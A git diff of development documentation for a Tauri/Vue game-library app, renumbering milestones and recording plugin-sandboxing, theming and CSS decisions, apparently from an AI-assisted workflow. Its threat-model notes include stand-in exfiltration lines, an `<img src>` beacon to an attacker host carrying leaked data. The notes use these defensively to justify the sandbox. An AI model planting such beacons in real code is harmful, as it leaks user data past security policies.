@@ -63,7 +63,7 @@ Natural follow-ups from Steam's real-world WASM migration, none required for any
     - **WASM export** - still structurally impossible, not just impractical. The Component Model can only cross typed functions/data (numbers, strings, records) over the host-guest boundary; a Vue component is a live object graph (render function, reactive `setup()`, lifecycle hooks) that has no representation on that boundary at all. No new WIT primitive or world design closes this - it's the same category of wall `Installable`-for-WASM already hit for settings UI, just for component rendering instead of config collection.
     - **Raw remote JS instead, bypassing WASM entirely** - this was in fact the *original* Milestone 8 plan before the pivot to WASM, and the reason for that pivot (`#[tauri::command]`s compile statically, so a JS-bundle plugin could only recombine capabilities the host already exposes, never add a new one) doesn't really bite here, since a theme component only renders `game` prop data it's already handed - no new native capability needed. But the security profile is a regression, not a wash: no memory-safety sandbox at all (same JS realm as the whole app, not an isolated one), full access to every already-exposed Tauri command rather than a narrow `host::` surface, and direct read/write access to every Pinia store in memory. The current CSP's `connect-src` lockdown (`ipc: http://ipc.localhost` only) would block a naive `fetch`-based exfil, but `img-src` still allows arbitrary `https:` - an `<img src="https://attacker.com/leak?data=...">` still works as a channel out even under today's CSP.
     - Verdict: closing this out as reviewed-and-blocked rather than leaving it open-ended. Pursuing the JS-bundle route now would mean shipping a *less* constrained install-by-URL tier while the WASM one's own capability-sandboxing gap (Milestone 12) is still unresolved - a bigger regression, not a smaller one.
-    - **Moved to Milestone 17 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 12's sandboxing gap being open - no longer holds; both Milestone 12 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
+    - **Moved to Milestone 16 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 12's sandboxing gap being open - no longer holds; both Milestone 12 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
     - **Revisited the "genuinely safe alternative" against a real precedent.** Playnite - a mature, established app solving the exact same problem in this exact product category - was checked for how it handles theme customization deeper than plain color/CSS values. Its answer: themes are `.xaml` files (WPF's declarative UI markup), parsed and rendered by WPF's own engine, never compiled/executable code - confirms the earlier "constrained declarative card template" idea isn't a hypothetical, it's the pattern mature game-library-manager theme systems actually converge on once CSS alone isn't enough. Sharper framing than originally noted: this doesn't need to be built from scratch as "a small template engine" - Vue itself already ships a runtime template compiler (`@vue/compiler-sfc`/full-build Vue) that compiles a plain *string* of Vue template syntax into a render function at runtime, no `import()` of arbitrary JS involved at all. That's Concourse's direct equivalent of XAML, already available in a dependency already in use. The real remaining design work if this is ever pursued is scope, not tooling - the compiled template's expression scope would need to be tightly whitelisted to `game` fields plus known formatting helpers, not the ambient app context, since unrestricted `{{ }}` interpolation can still call whatever's in scope. Still not proposed for implementation now - this only upgrades the alternative from speculative to concretely buildable with tooling already on hand, it doesn't reopen the "blocked" verdict for the existing `slots` tier itself
     - **Scope note on what "importing Vue" for this would actually mean**, since it's not obvious upfront. `@vitejs/plugin-vue` precompiles every `.vue` file at build time (`@vue/compiler-sfc` runs in Node, never ships to the browser), so the app currently only bundles Vue's *runtime* (reactivity + renderer + `h`) - nothing needs to compile a template string post-build today. Runtime-compiling a theme-provided template string would need exactly one missing piece added: `@vue/compiler-dom`'s `compile()`. Not a second Vue instance - Vue's packages (`reactivity`/`runtime-core`/`runtime-dom`/`compiler-dom`) are modules of one versioned whole, so adding `compiler-dom` just plugs the missing piece into the runtime already loaded, same `h`/component model/reactivity, no duplication, as long as the version matches exactly. Should be lazy (`import('@vue/compiler-dom')` only when a plugin actually declares a template override, code-split out of the main bundle), not bundled unconditionally for users who never install one. Also worth being precise about, not overclaiming: `{{ }}` interpolations aren't inert data placeholders once compiled - they're real evaluated JS expressions against whatever's exposed on the render context. Not equivalent to raw JS `import()` (no arbitrary statements, no module loading, no reaching `window`/`document` unless explicitly put in scope), but not zero-JS-execution either - the actual security property comes entirely from how tightly that exposed scope gets whitelisted, not from the compiler mechanism itself
 - Rename `steam-wasm` → `steam` cleanly, if ever wanted, including a one-time migration for anyone's already-persisted `enabled_plugins` setting so it doesn't silently desync (not done as part of the initial migration - see Milestone 8's note) - **resolved differently.** Revisited once every WASM plugin (not just Steam) had accumulated the same cosmetic issue: `plugin.json`'s `name` field still said "Steam (WASM)"/"GOG (WASM)"/etc., a suffix that only ever meant "disambiguate from the coexisting built-in during migration/comparison" - now meaningless since every built-in (`steam.rs`, `gog.rs`, `epic.rs`, `sgdb.rs`, `igdb.rs`) is fully retired, and LR/LE never had one to begin with. Explicitly chose *not* to touch `id` (`steam-wasm`, `gog-wasm`, etc. all stay as-is) - that's the part with real migration risk (`enabled_plugins`/`active_theme_id`-style persisted settings reference ids, not names), and nothing about the display text needed it. Dropped "(WASM)" from `name` across all 7 plugin repos (`steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `sgdb-metadata-wasm-plugin`, `igdb-metadata-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin`), bumped each to `0.1.1` (patch - cosmetic manifest field, no behavior/compatibility change) in both `plugin.json` and `Cargo.toml`. `.wasm` binaries themselves untouched (manifest is read from disk separately, never embedded in the compiled component), so no rebuild was needed - just re-verified each repo's `Cargo.toml` still parses (`cargo check`) and every edited `plugin.json` is still valid JSON
@@ -164,7 +164,7 @@ Current UI was a single flat top-to-bottom stack (settings panels, forms, and gr
   - User confirmed it worked, with one fix needed: a horizontal scrollbar had appeared on all three new scroll containers. Added `overflow-x: hidden` alongside `overflow-y: auto` on `.grid`/`.list`/`.settings-scroll` - `overflow-y: auto` alone doesn't imply `overflow-x: hidden`, so any content sizing right at the container's edge (grid gap rounding, themed scrollbar width itself eating into content width) was enough to trigger a second, unwanted horizontal bar. `bun run build`/`cargo check` both clean.
   - **Regression found by the user**: `.grid`'s new `overflow-x: hidden` clipped `GameCard.vue`'s own `.card:hover { transform: scale(1.06) }` at the leftmost/rightmost column - a scaled edge card now got visually cut off at the container's edge instead of overflowing cleanly the way a scaled middle-column card already does into its neighbor's `gap`. The real cause of the horizontal scrollbar was very likely this same transform in the first place (a transformed element's visual overflow does enlarge a scrollable ancestor's scroll region even though it doesn't affect layout), not a static width mismatch.
   - Fix: reverted `.grid`'s `overflow-x: hidden`, replaced with `padding: 0 var(--space-3) var(--space-5)` instead - giving the leftmost/rightmost column the same breathing room a middle column already gets for free from `gap`, so the hover scale never reaches the container's own edge at all. No scrollbar, no clipping, and `GameListRow.vue` (no hover transform of its own) kept its plain `overflow-x: hidden` unchanged, since it never had this failure mode to begin with. `bun run build`/`cargo check` both clean.
-- **Reverted the whole scrollbar-relocation attempt, replaced with a pinned filter bar instead.** User tried the change, hit the `GameCard` hover-clipping regression above, and after seeing it decided the underlying complaint (GameFilters scrolling away along with the list, rather than staying visible as a reference point) was better solved differently - a sticky filter bar, not a per-container scrollbar. Reverted `App.vue`/`GameFilters.vue`/`GameGrid.vue`/`GameList.vue` to their state from right before the relocation commit (`git checkout dfe117d -- <4 files>`, the commit closing Milestone 19, immediately prior to the scrollbar work) rather than hand-reconstructing the old CSS from memory - exact and verifiably clean.
+- **Reverted the whole scrollbar-relocation attempt, replaced with a pinned filter bar instead.** User tried the change, hit the `GameCard` hover-clipping regression above, and after seeing it decided the underlying complaint (GameFilters scrolling away along with the list, rather than staying visible as a reference point) was better solved differently - a sticky filter bar, not a per-container scrollbar. Reverted `App.vue`/`GameFilters.vue`/`GameGrid.vue`/`GameList.vue` to their state from right before the relocation commit (`git checkout dfe117d -- <4 files>`, the commit closing Milestone 18, immediately prior to the scrollbar work) rather than hand-reconstructing the old CSS from memory - exact and verifiably clean.
   - `App.vue`'s `.content` goes back to being the single scroll container (`overflow-y: auto`), same as originally, but its top padding moved to `0` - GameFilters.vue's own sticky element carries `padding-top: var(--space-5)` instead, so the visual gap above it stays identical whether it's at rest or pinned. A `position: sticky` element's "stuck" position ignores an ancestor's own padding entirely, so leaving that padding on `.content` would have made the gap collapse to flush the moment it actually stuck.
   - `GameFilters.vue`'s `.filters` gained `position: sticky; top: 0; z-index: 1; background: var(--color-base)` (opaque, so scrolled game rows don't show through underneath once pinned) plus a `border-bottom` for a persistent visual seam between the pinned bar and the scrolling content beneath it.
   - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed its own top-padding wrapper (`.settings-panel`) for the same reason as the earlier attempt's `.settings-scroll` - it has no sticky element of its own to carry that spacing, so `.content`'s dropped top padding needed to land somewhere.
@@ -186,7 +186,7 @@ Current UI was a single flat top-to-bottom stack (settings panels, forms, and gr
 - **Confirmed fixed - user asked one more polish step**: with `.filters` now genuinely spanning `.content`'s full width, add matching `var(--space-6)` horizontal padding to `.filters` itself too, so its *content* (the search input/tags) lines up visually with the grid/list below rather than sitting flush against the edges the grid/list are inset from. Replaced `.filters`' `padding-top: var(--space-5)` with `padding: var(--space-5) var(--space-6) 0` - safe with `width: 100%` since the project's global `*{box-sizing:border-box}` reset means padding doesn't add to that width. Verified via compiled CSS: `.filters[data-v-*]` now carries the full 3-value padding. `bun run build`/`cargo check` both clean.
 
 **Fixed a genuinely separate balloon-placement bug the pinned filter bar exposed, plus a bottom-padding polish request.** `useBalloonAnchor.ts`'s "above vs below" decision (`rect.top < MIN_SPACE_ABOVE`, a hardcoded `60px`) assumed the visible area's own top edge was the window's actual `y=0` - true before the filter bar existed, but no longer, since a top-row card scrolled to sit right under the now-pinned bar could still get placed "above," rendering (partially) behind the bar instead of flipping "below" it. The user specifically asked for this to be a real calculation against the bar's actual height, not another magic-number guess.
-- Gave `GameFilters.vue`'s `.filters` a dedicated `data-scroll-header` attribute - deliberately not reusing the `.filters` class name itself for this cross-component lookup, since that's a presentational hook that could change independently of "where does the pinned header end" as a concept. `useBalloonAnchor.ts` (used only by `GameCard.vue` now, since `BrickBlockGameCard.vue`'s use was removed along with the rest of Milestone 19's component-swap deletion) queries `document.querySelector('[data-scroll-header]')?.getBoundingClientRect().bottom` at hover time, falling back to `0` if absent (Big Picture/no filter bar present).
+- Gave `GameFilters.vue`'s `.filters` a dedicated `data-scroll-header` attribute - deliberately not reusing the `.filters` class name itself for this cross-component lookup, since that's a presentational hook that could change independently of "where does the pinned header end" as a concept. `useBalloonAnchor.ts` (used only by `GameCard.vue` now, since `BrickBlockGameCard.vue`'s use was removed along with the rest of Milestone 18's component-swap deletion) queries `document.querySelector('[data-scroll-header]')?.getBoundingClientRect().bottom` at hover time, falling back to `0` if absent (Big Picture/no filter bar present).
 - Changed the placement check from `rect.top < MIN_SPACE_ABOVE` to `rect.top - visibleTop < MIN_SPACE_ABOVE` - now measuring the card's clearance from the *real* visible-area boundary (the bar's actual current height, which varies depending on whether the tag-filter row is present) rather than assuming it's always exactly `60px` from the window's top.
 - Didn't add a post-render vertical remeasurement/correction pass (unlike the existing horizontal clamp, which does measure the balloon's real `offsetWidth` after mount) - the `MIN_SPACE_ABOVE` margin already accounts for typical balloon height as an estimate, and flipping placement *after* the balloon has already rendered "above" would risk a visible jump; kept scope to the actual reported bug (the boundary reference point being wrong), not a general balloon-height-vs-viewport robustness pass nobody asked for.
 - Filter bar bottom padding: added `var(--space-3)` as `.filters`' own bottom padding (was `0`, relying entirely on the external `margin-bottom` for spacing) - purely visual breathing room inside the pinned bar's own background before its content ends, distinct from the gap between the bar and the grid/list below it.
@@ -380,7 +380,7 @@ landed:
 ones."** Traced to `BigPictureSlideshow.vue`'s strip covers rendering their own hardcoded
 `img`/letter-placeholder markup, never wired into the `cardVisual` AST
 (`CardVisualRenderer`/`useActiveCardVisual`) the way `GameCard.vue`/`BigPictureTile.vue`
-already are (Milestone 19's "two consumers of the same registry" - now three). Under a theme
+already are (Milestone 18's "two consumers of the same registry" - now three). Under a theme
 with a custom `cardVisual` (Brick Block's star placeholder), grid and Big Picture grid tiles
 rendered it correctly while the slideshow silently fell back to a plain letter. Fixed with the
 identical pattern both existing consumers use, reusing the shared `.bp-cover-frame`/
@@ -521,7 +521,7 @@ them fully byte-identical (`diff` confirmed - the only differences left were a s
 comment and "tag list" vs. "collection list" in a code comment, no actual rule differences).
 Moved the whole shared block (`.panel`/`.sticky-header`/`.add-form`/`.item-list`/`.item-name`/
 `.item-count`/`.edit-input`/`.row-controls`/`.icon-button`/`.empty`) into `styles.css`,
-following the Milestone 18 convention rather than leaving real duplication in place - removed
+following the Milestone 17 convention rather than leaving real duplication in place - removed
 both components' now-fully-empty `<style scoped>` blocks entirely. Verified via compiled CSS
 that `.panel`/`.sticky-header` each compile exactly once (not once per component), and via
 `bun run build` (clean, CSS bundle shrank slightly).
@@ -622,13 +622,13 @@ lingering `desktop/<name>` reference missing `/tabs/` - none found. `bun run bui
 `devlog.md` end to end rather than assuming the earlier misplacement/renumbering cleanup and
 devlog backfill (both done earlier this session) were still fully accurate after the several
 rounds of work since - confirmed clean: every Milestone 14 bullet added since then already had
-a matching devlog entry, and nothing had drifted back into Milestone 20's section. Compacted
+a matching devlog entry, and nothing had drifted back into Milestone 19's section. Compacted
 the 4 most-recently-added Milestone 14 bullets (Tags/Collections tabs, the sticky-header/
 shared-style fix, the tags/collections store split, the tabs/ folder move) down to one-liners
 each, same as the earlier tidy pass did for the older ones - devlog already carries the full
 detail, `milestones.md` doesn't need to repeat it.
 
-**Version bump for tag-push.** Milestone 20 (Auto-Update) fully closed since the last version
+**Version bump for tag-push.** Milestone 19 (Auto-Update) fully closed since the last version
 bump (`1.3.7`, itself a patch bump for in-progress fixes *within* that milestone, set before
 it actually closed) - a real Post-1.0 Roadmap milestone closure, warranting the minor bump the
 project's own versioning policy ties to it. `1.3.7` -> `1.4.0` across `package.json`/
@@ -1150,7 +1150,7 @@ Real end-to-end testing (live API key) caught a genuine bug: searching "A Dance 
 
 This single-`fetch_metadata` design (and `search_game`/`fetch_description`, named above) was superseded shortly after by the metadata-plugin interface v2 redesign (`search-candidates`/`fetch-metadata-by-id`, 0.2.0) - see the Milestone 14 entry for the full multi-provider story (combined candidate picker, per-candidate thumbnails, exact-match filtering applied to IGDB/SteamGridDB too). Milestone closed out: merge-priority behavior against IGDB (first-non-null-wins in `enabledIds` order) was exercised for real throughout that work - both providers enabled simultaneously, live fetches against real games, and the exact tie-break mechanism confirmed directly when asked - rather than needing a dedicated one-off test.
 
-## Milestone 16 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
+## Milestone 15 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
 `proposal.md` lists these alongside Epic/GOG as source-plugin candidates; never scheduled. Each needs its own research pass (install detection method, manifest/registry format, launch mechanism) before implementation - unlike Epic/GOG, none of these were investigated during Milestone 7. Originally slotted into the core roadmap's own numbering; moved to the Post-1.0 Roadmap once 1.0 shipped with this untouched (see that milestone's own entry below for the move itself).
 
 ## Milestone 12 — WASM Plugin Capability Sandboxing (security)
@@ -1280,9 +1280,11 @@ committing) while explicitly keeping the human review/merge gate - not a request
 
 ## 1.0.0 — Core Roadmap Closed, Post-1.0 Roadmap Opened
 User call: bump `0.10.0` -> `1.0.0` now rather than waiting on the two leftover items (Milestone
-7's ROM scanner sub-item, and the core roadmap's Xbox/EA/Ubisoft stretch goal - since moved
-and renumbered to Milestone 16, entirely unstarted at the time). Judgment: Milestones 1–6 and
-8–11, plus both security milestones (now Milestones 12, 13, the most recently closed and
+7's ROM scanner sub-item - moved to its own milestone at the time, since renumbered again and
+iceboxed unnumbered entirely; and the core roadmap's Xbox/EA/Ubisoft stretch goal - since moved
+and renumbered to the milestone now numbered 15, entirely unstarted at the time). Judgment:
+Milestones 1–6 and 8–11, plus both security milestones (now Milestones 12, 13, the most recently
+closed and
 arguably the highest-stakes work in the whole roadmap), are done; the two remaining items are
 an unstarted stretch goal and one sub-item of an otherwise-closed polish milestone, neither
 blocking real-world use the way the original "post-M12" versioning note implied when it was
@@ -1303,8 +1305,8 @@ that later milestones passed by).
   replaced with "1.0.0 marks the core roadmap done, Post-1.0 minor bumps track closing a
   Post-1.0 Roadmap milestone"
 
-## Milestone 17 (legacy) — External Theme Plugins: Component-Override Tier (re-reviewed, still blocked)
-**Superseded** - milestones.md's Milestone 17 now tracks a different, narrower mechanism (a
+## Milestone 16 (legacy) — External Theme Plugins: Component-Override Tier (re-reviewed, still blocked)
+**Superseded** - milestones.md's Milestone 16 now tracks a different, narrower mechanism (a
 constrained template tier), scoped from the Brick Block measurement below. Kept here as the
 historical record; its actual conclusion (raw-JS/WASM component-override for external plugins is
 blocked) is still correct and unaffected by the entry that replaces it in milestones.md.
@@ -1335,13 +1337,13 @@ conditioned on ("not pursued until/unless Milestone 12/13 land") had genuinely c
   bear on this specific wall. Re-confirmed no third mechanism has emerged since Milestone 9's
   review either - the Vue-runtime-template-compiler idea documented there remains a different,
   narrower feature (a whitelisted template string) than an actual component-override tier, not a
-  way to unblock `slots` itself. Closed Milestone 17 on this negative-but-final result rather
+  way to unblock `slots` itself. Closed Milestone 16 on this negative-but-final result rather
   than leaving it open pending some future condition that isn't currently identifiable
 
-## Milestone 17 — External Theme Plugins: Constrained Template Tier (scoped, not built)
+## Milestone 16 — External Theme Plugins: Constrained Template Tier (scoped, not built)
 Prompted by a direct observation: Brick Block wasn't just a theme, it was Milestone 5's own
 built-in proof that component-override themes have real demand and work as a mechanism. That
-reframes the legacy Milestone 17 above - its "still blocked" verdict is about whether *external*
+reframes the legacy Milestone 16 above - its "still blocked" verdict is about whether *external*
 code can safely do what Brick Block does, not about whether the underlying idea (the Vue
 template-compiler tier, noted since Milestone 9) is worth building. Rather than write that
 verdict into milestones.md on vibes, measured it directly against Brick Block first.
@@ -1380,7 +1382,7 @@ verdict into milestones.md on vibes, measured it directly against Brick Block fi
   action-dispatch needs to be part of the tier. Left explicitly open in milestones.md rather than
   silently assumed either way, since a future theme that *does* want to restructure the action bar
   would hit this immediately
-- Net effect: replaced the legacy Milestone 17 entry in milestones.md rather than appending
+- Net effect: replaced the legacy Milestone 16 entry in milestones.md rather than appending
   alongside it - the new entry tracks a genuinely different, narrower mechanism (a scoped
   template tier) with a concrete measured basis (Brick Block) instead of the original's
   hypothetical Playnite-XAML comparison, and the legacy entry's own "blocked" conclusion (about
@@ -1430,7 +1432,7 @@ the footer's structure at all - identical markup and `@click` handlers to the ba
 via CSS. Zero measured demand for restructuring the action bar exists. Exposing store actions as
 template-callable would be real, non-trivial attack surface (a compiled template invoking
 mutations, not just reading data) built speculatively for a need that's never once shown up -
-the same over-scoping M17's re-review was built to avoid. If a real theme ever needs to
+the same over-scoping M16's re-review was built to avoid. If a real theme ever needs to
 rearrange the action bar, that's new, separately-scoped work when it actually happens, not
 designed in now against a hypothetical.
 
@@ -1545,7 +1547,7 @@ this milestone had already verified, not just in the abstract:
   tier doesn't need.** An opaque-origin iframe can't reach the host's `window` or Pinia, same
   structural isolation property already verified for Workers - but unlike a Worker, it has a
   real `document`, so a compromised template inside it can still build actual DOM (phishing
-  overlays, `<img src="https://attacker/...">` beacons) natively. Milestone 17 scoped this tier
+  overlays, `<img src="https://attacker/...">` beacons) natively. Milestone 16 scoped this tier
   as display/structure-only with no ambition for live interactive UI, so the iframe's extra DOM
   power is pure unused risk here - worth it only if the tier's ambition ever grows past what's
   actually measured
@@ -1565,7 +1567,7 @@ this milestone had already verified, not just in the abstract:
   literal content, one wrapper element are all directly expressible as AST node types, and
   nothing measured needs more than that
 - Worker isolation work above stays in devlog as a real, verified, sound design - not wrong,
-  just superseded by a cheaper and stricter option found afterward. Milestone 17's plan now
+  just superseded by a cheaper and stricter option found afterward. Milestone 16's plan now
   targets the AST vocabulary + interpreter instead of the worker/message-protocol/validator
 
 **Designed the AST vocabulary**, kept deliberately small and validated directly against Brick
@@ -1633,10 +1635,10 @@ type AstNode =
   `"constructor"` specifically, given what broke the compiler-dom prototype) is rejected;
   (4) an unknown node type (`"script"`) is rejected; (5) depth overflow and (6) node-count
   overflow both reject rather than silently truncating. All fail-closed, none silently coerced
-- Both of Milestone 17's remaining build items (interpreter, acceptance test) are done. What's
+- Both of Milestone 16's remaining build items (interpreter, acceptance test) are done. What's
   left: the manifest-signing addon, and the separately-tracked registry `theme`-kind follow-up
 
-**Built the manifest-signing addon - Milestone 17 fully closed.** `verify_plugin_provenance`
+**Built the manifest-signing addon - Milestone 16 fully closed.** `verify_plugin_provenance`
 (Milestone 13) turned out to already be fully generic - it just hashes and Sigstore-verifies
 whatever `&[u8]` it's given, nothing WASM-specific in its own logic at all. The only real work
 was threading a `manifest_url` parameter into `install_data_theme` (previously only took
@@ -1659,7 +1661,7 @@ against the manifest's own bytes instead of a `.wasm` binary.
   round-trip test, now asserting `!result.verified` explicitly (a localhost test server isn't
   hosted on github.com, so this exercises the real "not verified" branch, not just the happy
   path)
-- Milestone 17 is now fully closed: vocabulary, interpreter, acceptance test, signing addon.
+- Milestone 16 is now fully closed: vocabulary, interpreter, acceptance test, signing addon.
   Only the deliberately-separate registry `theme`-kind follow-up remains outside its scope
 
 **Registry `theme`-kind follow-up, done.** Real complication surfaced before writing anything:
@@ -1734,7 +1736,7 @@ verified the fix for real: checked the compiled CSS output and confirmed the sel
   automated/structural verification (compiled CSS, real validator/interpreter calls). Worth
   running the real app to eyeball it before calling this fully done
 
-**Closed a real gap in theme parity: signing (Milestone 13) and the registry pin (Milestone 17
+**Closed a real gap in theme parity: signing (Milestone 13) and the registry pin (Milestone 16
 follow-up) are separate, complementary mechanisms, and only one of them actually existed for
 themes.** User asked directly why a theme registry entry needs `wasmSha256` at all, given
 `data-theme-plugins` was never wired with the same `actions/attest-build-provenance` step the
@@ -1998,7 +2000,7 @@ the same way rather than leaving a known-identical bug sitting right next to the
 **Follow-up, on user request: `.info`'s fix redone as a proper token instead of a hardcoded
 literal, plus the same bug found in `StatsPanel.vue`.** User was fine with `.fetch-overlay`'s
 hardcoded `#fff` but wanted `.info` to go through a design token instead - consistent with
-Milestone 18's own shared-styles-convention push against magic values living in component CSS.
+Milestone 17's own shared-styles-convention push against magic values living in component CSS.
 Added `--color-scrim-text` to `styles.css`'s `:root` token block (default `#ffffff`, next to
 `--color-on-accent` with a comment explaining why it's a separate token rather than reusing that
 one: `--color-on-accent` tracks `--color-base`, which is exactly the wrong thing to track for
@@ -2094,7 +2096,7 @@ established convention. `data-theme-plugins`' Brick Block bump (1.6.0) committed
 separately in its own repo, no tag (plugin versioning is independent SemVer, not app-milestone-
 tracked - see `CLAUDE.md`).
 
-## Milestone 18 — Shared Styles Convention (scoped, not started)
+## Milestone 17 — Shared Styles Convention (scoped, not started)
 User proposed a style-convention change directly: less `<style scoped>` per component, more
 shared CSS (colors, borders, radii, other repeated patterns) collected into a `styles.css`.
 Asked whether this was "huge enough" to warrant its own milestone rather than just doing it -
@@ -2151,7 +2153,7 @@ way the milestone scoped it:
   documenting `:deep()` as the sanctioned escape hatch once `styles.css`'s conventions get
   written up. One forward-looking risk noted, not urgent: `BigPictureTile.vue` is currently
   swapped wholesale via `useThemeSlot` (a full component swap, safe), but if a "tile visual
-  AST" mechanism is ever added mirroring Milestone 17's card visual, `.tile-cover`/
+  AST" mechanism is ever added mirroring Milestone 16's card visual, `.tile-cover`/
   `.tile-cover-placeholder` would need the same unscoped treatment pre-emptively, not
   discovered the hard way again
 - Also flagged (not one of the three assigned categories, but real): `.settings-form` is a de
@@ -2336,7 +2338,7 @@ sub-patterns of varying overlap:
   Category 2 unused-token findings (`--space-2`/`--space-3` gaps, `--space-5` padding,
   `--color-on-accent`) are still open
 
-**Migrated the remaining Category 2 unused-token findings, closing out Milestone 18.** Gathered
+**Migrated the remaining Category 2 unused-token findings, closing out Milestone 17.** Gathered
 exact locations for every pattern with `grep -rn` first, rather than fixing from memory of the
 audit's summary. ~20 sites across the app:
 - `1px` borders → `var(--button-border-width)`: the global `input`/`textarea`/`select` rule
@@ -2374,7 +2376,7 @@ audit's summary. ~20 sites across the app:
   longer `var(--name)` references isn't a duplication-removal step like the earlier migrations,
   it's a correctness one)
 
-**Milestone 18 closed.** Audit → `:root`/primitive-styles relocation → all identified
+**Milestone 17 closed.** Audit → `:root`/primitive-styles relocation → all identified
 duplicate-pattern migrations (desktop, then Big Picture's cluster) → the two radius-scale
 decisions → this unused-token cleanup. Every step verified against real compiled output, not
 assumed correct from the source diff alone - caught real bugs at nearly every stage
@@ -2462,7 +2464,7 @@ danger)}` present once, zero leftover `.error[data-v-*]` rules anywhere. `bun ru
 
 **Button-styling consistency pass across components, on user's request.** Delegated to an
 Explore agent to audit every `<style scoped>` button rule in the tree, expecting the same kind
-of duplication findings as the rest of Milestone 18's follow-ups. The audit came back with
+of duplication findings as the rest of Milestone 17's follow-ups. The audit came back with
 something sharper: two of its findings weren't merely duplicated CSS, they were two components
 rendering the *same visual concept* with *actually divergent* results - real bugs, not just
 unmigrated repetition. Asked the user via `AskUserQuestion` whether to fix the two real bugs
@@ -2600,7 +2602,7 @@ the shared classes introduced this pass. The `--space-*` tokenization pass the a
 separately (hardcoded `0.25rem`/`0.35rem`/`0.4rem`/`2.2rem`/`46px` values off the spacing scale)
 remains open and unscoped - a distinct piece of follow-up work, not bundled into this pass.
 
-## Milestone 19 — Retire Component-Swap Theming (scoped, not started)
+## Milestone 18 — Retire Component-Swap Theming (scoped, not started)
 
 **Groundwork: matched `brick-block-data-theme`'s button frame to its card frame, on user
 request ("try copying GameCards' frame style to buttons in brick block theme").** First applied
@@ -2644,7 +2646,7 @@ way `slots` requires.
 
 **Decided to retire component-swap theming entirely rather than leave it stranded.** Weighed the
 tradeoff directly: JSON-AST/tokens are strictly safer for untrusted third-party themes (no code
-execution, validated schema - see Milestone 17's sandbox-escape findings for why that matters)
+execution, validated schema - see Milestone 16's sandbox-escape findings for why that matters)
 but bounded by whatever node types/hooks the core app has built; component-swap has no such
 ceiling but requires either build-time bundling (today's built-in-only limitation) or a much
 larger trust boundary for real third-party distribution. Given the project already committed to
@@ -2653,9 +2655,9 @@ signed/sandboxed WASM distribution for source plugins, and this session's own ho
 nearly all of Brick Block's *desktop*-card visual gap already, kept component-swap only made
 sense as a temporary bridge, not a permanent second theming mechanism.
 
-**Scoped Milestone 19 around the one real blocker: Big Picture.** `BigPictureTile.vue` never
+**Scoped Milestone 18 around the one real blocker: Big Picture.** `BigPictureTile.vue` never
 got the AST-override treatment `GameCard.vue` did - flagged as a forward-looking risk back in
-Milestone 18's audit, now the concrete reason this can't just be deleted today.
+Milestone 17's audit, now the concrete reason this can't just be deleted today.
 `BrickBlockBigPictureTile.vue`'s look (4px pixel border, diagonal-stripe placeholder, pixel
 font) has no data-theme equivalent path, and its frame/placeholder colors (`#111`/`#444`) are
 hardcoded literals, not tokenized like `GameCard.vue`'s already are. Scoped the milestone to
@@ -2683,7 +2685,7 @@ needs rendering.
 - Confirmed no further sizing work was needed: the AST's `.cover`/`.cover-placeholder` classes'
   global `width: 100%; aspect-ratio: 3/4; object-fit: cover` values already exactly matched
   `.tile-cover`/`.tile-cover-placeholder`'s own values - not a coincidence, both were already
-  aligned during Milestone 18's tokenization pass.
+  aligned during Milestone 17's tokenization pass.
 - `bun run build` (typecheck + build) clean; `cargo check` clean (no Rust touched).
 
 **Tokenized `BigPictureTile.vue`'s frame/title, the milestone's second checklist item.**
@@ -2716,7 +2718,7 @@ nothing on `.tile-title` to hook into either.
 **Ported Brick Block's Big Picture tile look to `brick-block-data-theme`'s manifest
 (`data-theme-plugins` repo).** No new AST work needed here at all - the manifest's existing
 `cardVisual` field (the `if`/`image`/`else`-`★` shape, already written for the desktop card back
-in Milestone 17) is the same shared registry `BigPictureTile.vue` now reads too, so the star
+in Milestone 16) is the same shared registry `BigPictureTile.vue` now reads too, so the star
 glyph and cover-art swap already worked correctly the moment the AST render path landed. This
 pass only needed the new `--tile-*` hooks set in `cssVariables`:
 - `--tile-background`: the same diagonal-stripe `repeating-linear-gradient` pattern as
@@ -2793,15 +2795,15 @@ parity had just been verified.
   `bun run build` (typecheck + build) and `cargo check` both clean; JS/CSS bundle shrank as
   expected (one fewer CSS chunk - the built-in plugin's own bundled `@font-face` asset is gone).
 
-**Milestone 19 fully closed.** `cardVisual` AST + CSS-variable opt-in hooks is now the only
+**Milestone 18 fully closed.** `cardVisual` AST + CSS-variable opt-in hooks is now the only
 theming mechanism in the app, for both desktop and Big Picture, for every theme kind (built-in
 default, data-only, and any future third-party one) - `slots`/component-swap theming, which only
 ever had one real consumer, no longer exists at all.
 
-**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14/19 sections had
+**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14/18 sections had
 drifted back into devlog-style multi-line narrative (the pinned-filter-bar saga especially,
 several paragraphs per bullet) - condensed both back to one-line-per-item, matching the
-convention already applied to Milestones 17/18 earlier. Also delegated a codebase-wide sweep
+convention already applied to Milestones 16/17 earlier. Also delegated a codebase-wide sweep
 (via Explore) for in-code comments narrating past events/decisions rather than documenting a
 present-tense invariant - found real candidates in `App.vue`, `GameFilters.vue`,
 `GameListRow.vue`, `stores/wrapperPlugins.ts`, `db.rs`, `plugin_installer.rs`, and
@@ -2815,7 +2817,7 @@ comments) - not everything referencing a past milestone number is narrative bloa
 the surrounding sentence was pure event narration with no bearing on how to safely edit the code
 today. `bun run build`/`cargo check` both clean (comment-only changes, no behavior change).
 
-## Milestone 20 — Auto-Update: App + Plugins/Themes (scoped, not started)
+## Milestone 19 — Auto-Update: App + Plugins/Themes (scoped, not started)
 
 **Scoped from a design discussion, on user request.** User specified three concrete trigger
 moments up front (app start, app focus, install-plugin modal open) before asking for
@@ -2863,7 +2865,7 @@ plugin, not new application logic with an unknown schema change blocking it.
   releases/latest/download/latest.json"]`. Also had to open the app's CSP `connect-src` for
